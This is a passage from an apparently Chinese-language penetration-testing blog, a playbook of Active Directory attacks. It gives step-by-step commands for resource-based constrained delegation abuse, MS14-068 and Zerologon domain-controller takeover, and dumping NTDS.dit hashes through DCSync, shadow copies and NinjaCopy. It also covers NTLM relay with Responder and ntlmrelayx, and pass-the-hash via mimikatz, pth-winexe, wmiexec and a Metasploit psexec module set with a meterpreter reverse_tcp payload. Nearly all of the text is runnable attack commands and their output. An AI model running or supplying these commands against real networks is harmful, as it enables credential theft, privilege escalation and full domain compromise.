/ptt</span><br></pre></td></tr></table></figure><h3 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h3><blockquote><p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution</a></p><p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#genericall-genericwrite-write-on-computer">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#genericall-genericwrite-write-on-computer</a></p></blockquote><ul><li><p>原理</p><p>普通域用户默认可以创建最多10个新的计算机账户</p><p>不需要域管理员权限去设置基于资源的约束委派（Resource-based constrained delegation）相关属性</p><p>普通域用户可以设置资源约束委派相关属性</p></li><li><p>条件</p><p>一个普通域用户权限</p><p>域控为Server 2012及以上版本</p><p>对目标主机拥有写权限</p></li><li><p>操作</p></li></ul><p>测试环境是在一台域计算机上登录的普通域用户</p><p>创建一个名为testpc的计算机账户，并获取testpc的SID</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import-module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount testpc -Password $(ConvertTo-SecureString <span class="string">&quot;Admin123&quot;</span> -AsPlainText -Force)</span><br><span class="line"></span><br><span class="line">dsquery.exe * -filter <span class="string">&quot;(&amp;(sAMAccountName=testpc$))&quot;</span> -<span class="built_in">limit</span> 0 -attr *</span><br><span class="line">这里获取到的为 S-1-5-21-4030334565-2237076002-3168552227-1603</span><br></pre></td></tr></table></figure><p>配置基于资源的约束委派属性</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import-module .\Microsoft.ActiveDirectory.Management.dll</span><br><span class="line"><span class="variable">$SD</span> = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4030334565-2237076002-3168552227-1603)&quot;</span></span><br><span class="line"><span class="variable">$SDBytes</span> = New-Object byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, 0)</span><br><span class="line"></span><br><span class="line">Import-Module .\PowerSploit-master\PowerSploit.psm1</span><br><span class="line">Get-DomainComputer WIN-JSGIJOFK3T7 | Set-DomainObject -Set @&#123;<span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="variable">$SDBytes</span>&#125; -Verbose</span><br><span class="line">Get-DomainComputer WIN-JSGIJOFK3T7 -Properties msds-allowedtoactonbehalfofotheridentity</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>配置完msDS-AllowedToActOnBehalfOfOtherIdentity属性之后就可以通过基于资源的约束委派去攻击目标主机了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">将密码转换为<span class="built_in">hash</span></span><br><span class="line">Rubeus.exe <span class="built_in">hash</span> /user:testpc /password:Admin123 /domain:ddh.com</span><br><span class="line"></span><br><span class="line">然后用testpc$的<span class="built_in">hash</span>请求白银票据并导入到当前会话中</span><br><span class="line">Rubeus.exe s4u /user:testpc$ /rc4:E45A314C664D40A227F9540121D1A29D /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</span><br></pre></td></tr></table></figure><h1 id="一键打域控"><a href="#一键打域控" class="headerlink" title="一键打域控"></a>一键打域控</h1><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><ul><li><p><strong>效果</strong></p><p>从普通域用户提升为域管理员</p></li><li><p><strong>条件</strong></p><p>一个普通域账号及其正确的密码</p><p>未打补丁 KB3011780</p></li><li><p><strong>操作</strong></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;exploit::ms14068 /domain:tt.com /user:ddh /password:Admin123 /ptt&quot; <span class="keyword">exit</span></span><br><span class="line">psexec \\WIN-J341S97EGGH.tt.com <span class="built_in">cmd</span></span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goldenPac.exe tt.com/ddh:Admin123@WIN-J341S97EGGH.tt.com</span><br></pre></td></tr></table></figure></li><li><p>实践</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>&gt;<span class="title">MS14</span>-068.<span class="title">exe</span> -<span class="title">u</span> <span class="title">ddh</span>@<span class="title">tt.com</span> -<span class="title">p</span> <span class="title">Admin123</span> -<span class="title">s</span> <span class="title">S</span>-1-5-21-1881962959-1052950955-462027270 -<span class="title">d</span> <span class="title">WIN</span></span></span><br><span class="line"><span class="function">-<span class="title">J341S97EGGH.tt.com</span></span></span><br><span class="line"><span class="function">  [+] <span class="title">Building</span> <span class="title">AS</span>-<span class="title">REQ</span> <span class="title">for</span> <span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>... <span class="title">Done</span>!</span></span><br><span class="line"><span class="function">  [+] <span class="title">Sending</span> <span class="title">AS</span>-<span class="title">REQ</span> <span class="title">to</span> <span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>... <span class="title">Done</span>!</span></span><br><span class="line"><span class="function">  [+] <span class="title">Receiving</span> <span class="title">AS</span>-<span class="title">REP</span> <span class="title">from</span> <span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>... <span class="title">Done</span>!</span></span><br><span class="line"><span class="function">  [+] <span class="title">Parsing</span> <span class="title">AS</span>-<span class="title">REP</span> <span class="title">from</span> <span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>... <span class="title">Done</span>!</span></span><br><span class="line"><span class="function">  [+] <span class="title">Building</span> <span class="title">TGS</span>-<span class="title">REQ</span> <span class="title">for</span> <span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>... <span class="title">Done</span>!</span></span><br><span class="line"><span class="function">  [+] <span class="title">Sending</span> <span class="title">TGS</span>-<span class="title">REQ</span> <span class="title">to</span> <span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>... <span class="title">Done</span>!</span></span><br><span class="line"><span class="function">  [+] <span class="title">Receiving</span> <span class="title">TGS</span>-<span class="title">REP</span> <span class="title">from</span> <span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>... <span class="title">Done</span>!</span></span><br><span class="line"><span class="function">  [+] <span class="title">Parsing</span> <span class="title">TGS</span>-<span class="title">REP</span> <span class="title">from</span> <span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>... <span class="title">Done</span>!</span></span><br><span class="line"><span class="function">  [+] <span class="title">Creating</span> <span class="title">ccache</span> <span class="title">file</span> &#x27;<span class="title">TGT_ddh</span>@<span class="title">tt.com.ccache</span>&#x27;... <span class="title">Done</span>!</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="CVE-2019-1040"><a href="#CVE-2019-1040" class="headerlink" title="CVE-2019-1040"></a>CVE-2019-1040</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;QAX-A-Team&#x2F;dcpwn</span><br></pre></td></tr></table></figure><p><img src="/images/image-20210104164910176.png" alt="image-20210104164910176"></p><h3 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h3><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;dirkjanm&#x2F;CVE-2020-1472</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket&#x2F;archive&#x2F;master.zip</span><br><span class="line">cd impacket-master</span><br><span class="line">pip install .</span><br></pre></td></tr></table></figure><p>第一步</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">py3 cve-2020-1472-exploit.py DC_HOSTNAME DC_IP</span><br><span class="line">py3 cve-2020-1472-exploit.py WIN-DDOA470G8AI 11.1.1.131</span><br></pre></td></tr></table></figure><p><img src="/images/image-20201107101519800.png" alt="image-20201107101519800"></p><p>第二步</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(注意下面的命令如果在linux上，$需要转义为\$)</span><br><span class="line">py3 impacket-master\examples\secretsdump.py WIN-DDOA470G8AI$@11.1.1.131 -just-dc -no-pass</span><br></pre></td></tr></table></figure><p><img src="/images/image-20201107101544723.png" alt="image-20201107101544723"></p><p>第三步</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py3 impacket-master\examples\wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:30a96699356033b84283b8918a895d67 administrator@11.1.1.131</span><br></pre></td></tr></table></figure><p><img src="/images/image-20201107101619262.png" alt="image-20201107101619262"></p><h1 id="域hash"><a href="#域hash" class="headerlink" title="域hash"></a>域hash</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hash 值存储在域控制器中（C:\Windows\NTDS\NTDS.DIT）</span><br><span class="line">NTDS.DIT 文件经常被操作系统使用，无法直接复制到其它位置。</span><br></pre></td></tr></table></figure><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:god.org &#x2F;all &#x2F;csv</span><br></pre></td></tr></table></figure><h3 id="ntdsutil导出快照"><a href="#ntdsutil导出快照" class="headerlink" title="ntdsutil导出快照"></a>ntdsutil导出快照</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建快照</span></span><br><span class="line">ntdsutil snapshot <span class="string">&quot;activate instance ntds&quot;</span> create quit quit</span><br><span class="line">GUID 为 &#123;aa488f5b-40c7-4044-b24f-16fd041a6de2&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 挂载快照</span></span><br><span class="line">ntdsutil snapshot <span class="string">&quot;mount GUID&quot;</span> quit quit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制 ntds.dit</span></span><br><span class="line">copy C:\$SNAP_201908200435_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载快照</span></span><br><span class="line">ntdsutil snapshot <span class="string">&quot;unmount GUID&quot;</span> quit quit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除快照</span></span><br><span class="line">ntdsutil snapshot <span class="string">&quot;delete GUID&quot;</span> quit quit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询快照</span></span><br><span class="line">ntdsutil snapshot <span class="string">&quot;List All&quot;</span> quit quit</span><br><span class="line">ntdsutil snapshot <span class="string">&quot;List Mounted&quot;</span> quit quit</span><br></pre></td></tr></table></figure><h3 id="vssadmin创建卷影"><a href="#vssadmin创建卷影" class="headerlink" title="vssadmin创建卷影"></a>vssadmin创建卷影</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 查询当前系统的快照</span><br><span class="line">vssadmin list shadows</span><br><span class="line"></span><br><span class="line"># 创建快照</span><br><span class="line">vssadmin create shadow &#x2F;for&#x3D;c: &#x2F;autoretry&#x3D;10</span><br><span class="line">&quot;Shadow Copy Volume Name&quot; 为 \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</span><br><span class="line">&quot;Shadow Copy ID&quot; 为 &#123;aa488f5b-40c7-4044-b24f-16fd041a6de2&#125;</span><br><span class="line"></span><br><span class="line"># 复制 ntds.dit</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit</span><br><span class="line"></span><br><span class="line"># 删除快照</span><br><span class="line">vssadmin delete shadows &#x2F;for&#x3D;c: &#x2F;quiet</span><br></pre></td></tr></table></figure><h3 id="Invoke-NinjaCopy"><a href="#Invoke-NinjaCopy" class="headerlink" title="Invoke-NinjaCopy"></a>Invoke-NinjaCopy</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1</span><br><span class="line">.\Invoke-NinjaCopy.ps1 -path c:\windows\system32\config\system -localdestination c:\<span class="built_in">test</span>\ -verbose -computername workstationvm</span><br></pre></td></tr></table></figure><h3 id="从ntds-dit还原"><a href="#从ntds-dit还原" class="headerlink" title="从ntds.dit还原"></a>从ntds.dit还原</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/zcgonvh/NTDSDumpEx</span><br><span class="line">usage: ntdsdumpex.exe &lt;-d ntds.dit&gt; &lt;-k HEX-SYS-KEY | -s system.hiv |-r&gt; [-o out.txt] [-h] [-m] [-p] [-u]</span><br><span class="line">-d    path of ntds.dit database</span><br><span class="line">-k    use specified SYSKEY</span><br><span class="line">-s    parse SYSKEY from specified system.hiv</span><br><span class="line">-r    <span class="built_in">read</span> SYSKEY from registry</span><br><span class="line">-o    write output into</span><br><span class="line">-h    dump <span class="built_in">hash</span> histories(<span class="keyword">if</span> available)</span><br><span class="line">-p    dump description and path of home directory</span><br><span class="line">-m    dump machine accounts</span><br><span class="line">-u    USE UPPER-CASE-HEX</span><br><span class="line"></span><br><span class="line"><span class="comment"># 离线模式：先导出注册表</span></span><br><span class="line">reg save hklm\system system.hiv</span><br><span class="line">NTDSDumpEx.exe -d ntds.dit -s system.hiv -o hash.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在线模式：无需导出注册表</span></span><br><span class="line">NTDSDumpEx.exe -d ntds.dit -r -o hash.txt</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -ntds.dit -system system.hive LOCAL</span><br></pre></td></tr></table></figure><h1 id="中间人"><a href="#中间人" class="headerlink" title="中间人"></a>中间人</h1><h3 id="NTLM中继"><a href="#NTLM中继" class="headerlink" title="NTLM中继"></a>NTLM中继</h3><ul><li><p><strong>原理</strong></p><p>在局域网中发送LLMNR欺骗、WPAD劫持、DHCP（IPv6）欺骗等，实现中间人攻击</p><p>中间人劫持到SMB流量、http basic认证流量等，从中进行修改和利用</p><p>关闭了SMB签名的主机才能进行smb劫持，http劫持不受签名影响，但是获取的net-ntlm。</p></li><li><p><strong>条件</strong></p><p>同C段下系统权限主机一台</p></li><li><p><strong>操作</strong></p></li></ul><p>首先通过Responder进行中间人攻击，-i 参数为本机IP，修改Responder.conf配置文件，将SMB和HTTP模块设置为Off，这个由ntlmrelayx模块来专门做smb的中继。当主机通过IE浏览器访问任意网站时，Responder将劫持为返回一个401的响应，而浏览器收到后自动将本地的认证信息带上后再次请求，从而获取到Net-NTLM，可以用来破解。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder.exe -i 192.168.19.136 -rdwPv</span><br></pre></td></tr></table></figure><img src="/images/image-20200907144743847.png" alt="image-20200907144743847" style="zoom:80%;" /><p><img src="/images/image-20200907152938971.png" alt="image-20200907152938971"></p><p>在开启了中间人后，就可以同时开启ntlm中继，原理是在攻击机上使用ntlmrelayex监听445，从而对smb请求进行修改和重发。中继只能对关闭了smb签名的主机进行中继。</p><p>找到关闭了SMB签名的主机，把IP写入targets.txt：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py2 RunFinger.py -i 192.168.19.0/24</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;<span class="number">192.168</span><span class="number">.19</span><span class="number">.8</span>&#x27;, Os:&#x27;Windows Server <span class="number">2008</span> R2 Enterprise <span class="number">7601</span> Service Pack <span class="number">1</span>&#x27;, Domain:&#x27;TT&#x27;, Signing:&#x27;True&#x27;, Time:&#x27;<span class="number">2020</span><span class="number">-09</span><span class="number">-07</span> <span class="number">14</span>:<span class="number">48</span>:<span class="number">19</span>&#x27;]</span><br><span class="line">[&#x27;<span class="number">192.168</span><span class="number">.19</span><span class="number">.129</span>&#x27;, Os:&#x27;Windows <span class="number">7</span> Ultimate <span class="number">7601</span> Service Pack <span class="number">1</span>&#x27;, Domain:&#x27;TT&#x27;, Signing:&#x27;False&#x27;, Time:&#x27;<span class="number">2020</span><span class="number">-09</span><span class="number">-07</span> <span class="number">14</span>:<span class="number">48</span>:<span class="number">19</span>&#x27;]</span><br><span class="line">[&#x27;<span class="number">192.168</span><span class="number">.19</span><span class="number">.136</span>&#x27;, Os:&#x27;Windows Server <span class="number">2012</span> R2 Standard <span class="number">9600</span>&#x27;, Domain:&#x27;WORKGROUP&#x27;, Signing:&#x27;False&#x27;, Time:&#x27;<span class="number">2020</span><span class="number">-09</span><span class="number">-07</span> <span class="number">14</span>:<span class="number">48</span>:<span class="number">19</span>&#x27;]</span><br></pre></td></tr></table></figure><p>ntlmrelay中继，windows上只能使用python版，ntlmrelayx.py是impacket包（建议使用python3.6）中自带的。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注意，使用-c执行命令时，不会同时导出hash。</span><br><span class="line">ntlmrelayx的http模块测试时有问题，不能导出hash。可以使用--no-http-server参数关闭http模块，并将responder配置文件中的HTTP模块打开，还是使用responder的HTTP模块获取NTLM hash。</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntlmrelayx.py -tf targets.txt -smb2support</span><br><span class="line">ntlmrelayx.py -tf targets.txt -smb2support -c calc</span><br></pre></td></tr></table></figure><p><img src="/images/image-20200907165616841.png" alt="image-20200907165616841"></p><h3 id="CVE-2019-1040-1"><a href="#CVE-2019-1040-1" class="headerlink" title="CVE-2019-1040"></a>CVE-2019-1040</h3><ul><li><p><strong>效果</strong></p><p>NTLM中间人是被动触发，等待通段下主机访问其他主机时进行劫持。而这个漏洞可以让域控主动请求我们。</p><p>普通域用户提升为管理员。</p><p>安装impacket包</p></li><li><p><strong>条件</strong></p><p>普通域用户账号密码</p><p>exchange服务</p></li><li><p><strong>操作</strong></p></li></ul><p>中继</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntlmrelayx.py --remove-mic --escalate-user ddh -t ldap:&#x2F;&#x2F;WIN-J341S97EGGH.tt.com -smb2support -debug</span><br></pre></td></tr></table></figure><p>触发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 printerbug.py tt.com&#x2F;ddh@WIN-J341S97EGGH.tt.com 192.168.19.8</span><br></pre></td></tr></table></figure><p>DCSync</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py tt.com&#x2F;ddh@WIN-J341S97EGGH.tt.com -just-dc</span><br></pre></td></tr></table></figure><h3 id="NTLM利用"><a href="#NTLM利用" class="headerlink" title="NTLM利用"></a>NTLM利用</h3><h4 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注意<span class="built_in">hash</span>注入后使用whoami看到的还会是当前用户，需要通过 dir \\IP\c$ 去检查密码是否正确</span><br><span class="line">mimikatz</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:Administrator /domain:172.16.1.8 /ntlm:5645ce11902f46d5ef222f94d99d7d1a</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">限制条件</span><br><span class="line">需要服务器端开启了Restricted Admin mode模式，受限管理员模式 ，主要功能是使得凭据不会暴露在目标系统中，使用当前Windows登录凭据，不需要输入口令，直接登录即可。所以为PTH提供了可能</span><br><span class="line"></span><br><span class="line">适用系统</span><br><span class="line">Windows 8.1和Windows Server 2012 R2默认支持该功能</span><br><span class="line">Windows 7和Windows Server 2008 R2默认不支持，需要安装补丁2871997、2973351</span><br><span class="line"></span><br><span class="line">开启RAM模式</span><br><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; &#x2F;v DisableRestrictedAdmin &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line"></span><br><span class="line">使用RAM模式连接</span><br><span class="line">mstsc.exe &#x2F;restrictedadmin</span><br><span class="line"></span><br><span class="line">综上述，Server需要开启RAM模式，Client需要支持RAM</span><br><span class="line"></span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:remoteserver &#x2F;ntlm:d25ecd13fddbb542d2e16da4f9e0333d &quot;&#x2F;run:mstsc.exe &#x2F;restrictedadmin&quot;</span><br><span class="line">然后直接连接登录即可。</span><br><span class="line"></span><br><span class="line">或者使用kali下的xfreerdp进行连接</span><br><span class="line">xfreerdp &#x2F;u:administrator &#x2F;pth:d25ecd13fddbb542d2e16da4f9e0333d &#x2F;v:192.168.62.136 &#x2F;cert-ignore</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="PTH其他工具"><a href="#PTH其他工具" class="headerlink" title="PTH其他工具"></a>PTH其他工具</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">MSF:</span><br><span class="line">条件：①开启445端口SMB服务（默认开启）；②开启admin$共享</span><br><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec</span><br><span class="line">set RHOSTS 192.168.1.178</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LPORT 4444</span><br><span class="line">set LHOST 192.168.1.144</span><br><span class="line">set SMBUSER Administrator</span><br><span class="line">set SMBPASS d747b7b8037e8669c771f6a9d803419b:86c01dc8633fc387a503b05615f8afb1</span><br><span class="line">set SMBDomain WORKGROUP</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">Kali:</span><br><span class="line">kali存在以下pass the hash利用工具</span><br><span class="line"></span><br><span class="line">pth-curl</span><br><span class="line">pth-rpcclient</span><br><span class="line">pth-net</span><br><span class="line">pth-smbclient</span><br><span class="line">pth-smbget</span><br><span class="line">pth-sqsh</span><br><span class="line">pth-winexe</span><br><span class="line">pth-wmis</span><br><span class="line">pth-wmic</span><br><span class="line"></span><br><span class="line">pth-winexe -U Administrator%d747b7b8037e8669c771f6a9d803419b:86c01dc8633fc387a503b05615f8afb1 &#x2F;&#x2F;192.168.1.178 cmd</span><br><span class="line"></span><br><span class="line">Wmiexec:</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;CoreSecurity&#x2F;impacket&#x2F;blob&#x2F;master&#x2F;examples&#x2F;wmiexec.py</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;maaaaz&#x2F;impacket-examples-windows</span><br><span class="line"></span><br><span class="line">python wmiexec.py -hashes d747b7b8037e8669c771f6a9d803419b:86c01dc8633fc387a503b05615f8afb1 WORKSPACE&#x2F;Administrator@192.168.1.178 &quot;whoami&quot;</span><br><span class="line"></span><br><span class="line">【注】py文件中提示需要Admin用户，经测试普通用户权限即可；</span><br><span class="line">hashes参数格式为LMHASH:NTHASH，由于高版本Windows系统默认不支持LMhash，所以LM可以设定为任意值；</span><br><span class="line">wmiexec.exe是通过python impacket库实现的，生成的exe有点大，5M大小在实战起来有点不方便</span><br><span class="line"></span><br><span class="line">Powershell:</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Kevin-Robertson&#x2F;Invoke-TheHash&#x2F;</span><br><span class="line"></span><br><span class="line">Invoke-WMIExec:</span><br><span class="line">Invoke-WMIExec -Target 192.168.1.161 -Domain WORKGROUP -Username  Yoga -Hash AAD3B435B51404EEAAD3B435B51404EE:14CE14C36F1F350380B41C6F4D42BC06 -Command &quot;calc.exe&quot; -verbose</span><br><span class="line"></span><br><span class="line">Invoke-SMBExec:</span><br><span class="line">Invoke-SMBExec -Target 192.168.1.161 -Domain WORKGROUP -Username  Yoga -Hash AAD3B435B51404EEAAD3B435B51404EE:14CE14C36F1F350380B41C6F4D42BC06 -Command &quot;calc.exe&quot; -verbose</span><br><span class="line"></span><br><span class="line">Invoke-SMBClient:</span><br><span class="line">支持SMB1，SMB2，SMB signing 如果只有SMB文件共享的权限，没有远程执行权限，可以使用这个脚本。可以列举目录、上传文件、下载文件、删除文件（取决于该口令Hash的权限）</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="crackmapexec爆破"><a href="#crackmapexec爆破" class="headerlink" title="crackmapexec爆破"></a>crackmapexec爆破</h4><p>最新编译（推荐使用Ubuntu版本）</p><p>windows上可以使用的exe版是很老的版本，这里下载的windows版不是exe的，需要使用python3 cme来运行</p><figure class="highlight plain"><table><tr><td 